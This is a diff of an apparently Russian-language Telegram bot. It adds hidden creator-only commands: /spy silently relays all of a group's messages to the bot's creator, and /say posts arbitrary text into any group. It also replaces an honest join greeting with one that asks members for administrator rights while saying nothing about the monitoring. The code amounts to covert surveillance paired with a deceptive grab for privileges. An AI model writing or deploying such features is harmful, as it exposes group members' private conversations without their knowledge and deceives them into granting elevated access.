@@ -198,6 +198,49 @@ async def cmd_delvip(message: types.Message):
 
 from database.whitelist import add_to_whitelist, remove_from_whitelist, get_whitelist
 
+from database.spy import toggle_spy
+
+@router.message(Command("say"))
+async def cmd_say(message: types.Message, bot: Bot):
+    if not is_creator(message):
+        return
+
+    parts = message.text.split(maxsplit=2)
+    if len(parts) < 3:
+        await message.answer("Использование: <code>/say <id_группы> <сообщение></code>")
+        return
+
+    try:
+        chat_id = int(parts[1])
+        text_to_say = parts[2]
+
+        await bot.send_message(chat_id=chat_id, text=text_to_say, parse_mode=None)
+        await message.answer(f"✅ Сообщение отправлено в группу <code>{chat_id}</code>")
+    except ValueError:
+        await message.answer("ID группы должен быть числом.")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка отправки: {e}")
+
+@router.message(Command("spy"))
+async def cmd_spy(message: types.Message):
+    if not is_creator(message):
+        return
+
+    args = message.text.split()
+    if len(args) < 2:
+        await message.answer("Укажите ID группы. Пример: <code>/spy -100123456789</code>")
+        return
+
+    try:
+        chat_id = int(args[1])
+        is_enabled = await toggle_spy(chat_id)
+        if is_enabled:
+            await message.answer(f"👁 Режим шпионажа для группы <code>{chat_id}</code> ВКЛЮЧЕН.\nТеперь вы будете получать все их сообщения.")
+        else:
+            await message.answer(f"🙈 Режим шпионажа для группы <code>{chat_id}</code> ВЫКЛЮЧЕН.")
+    except ValueError:
+        await message.answer("ID группы должен быть числом.")
+
 @router.message(Command("allow"))
 async def cmd_allow(message: types.Message):
     if not is_creator(message):
@@ -253,10 +296,10 @@ async def bot_added_to_chat(event: types.ChatMemberUpdated, bot: Bot):
         from bot.config import CREATOR_ID
 
         try:
-            # Сообщаем в саму группу, что мы ждем аппрува
+            # Новое приветствие
             await bot.send_message(
                 chat_id=chat_id,
-                text="Привет! Я добавлен в эту группу, но она не находится в моем белом списке. Я отправил запрос своему создателю. Жду разрешения на работу! 🛡"
+                text="Вы меня добавили в группу, в которой я не являюсь админом. Выдайте мне администратора, чтобы я мог работать, в течении от 1 до 24 часов."
             )
         except Exception as e:
             print(f"Ошибка при приветствии в новой группе: {e}")
@@ -270,8 +313,9 @@ async def bot_added_to_chat(event: types.ChatMemberUpdated, bot: Bot):
                         f"Название: <b>{chat_title}</b>\n"
                         f"ID группы: <code>{chat_id}</code>\n"
                         f"Кто добавил: <b>{event.from_user.full_name}</b> (<code>{event.from_user.id}</code>)\n\n"
-                        f"<i>Группа не в белом списке. Чтобы разрешить работу, введите:</i>\n"
-                        f"<code>/allow {chat_id}</code>"
+                        f"Добавить в белый список: <code>/allow {chat_id}</code>\n"
+                        f"Наблюдать за чатом: <code>/spy {chat_id}</code>\n"
+                        f"Написать туда: <code>/say {chat_id} текст</code>"
                     )
                 )
             except Exception as e:
